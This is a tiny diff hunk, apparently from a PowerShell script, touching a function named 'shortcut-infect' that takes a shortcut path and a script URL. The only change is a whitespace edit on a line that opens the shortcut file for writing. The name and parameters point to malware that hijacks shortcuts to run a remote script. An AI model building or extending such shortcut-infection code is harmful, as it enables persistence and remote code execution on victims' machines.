@@ -368,7 +368,7 @@ function shortcut-infect($shortcutFullname, $scriptUrl) {
 		try { 
 
 			$f = Get-Item $shortcutFullName -erroraction 'silentlycontinue'
-           	$fh = $f.OpenWrite()
+           		$fh = $f.OpenWrite()
 
 		} catch { 
 			
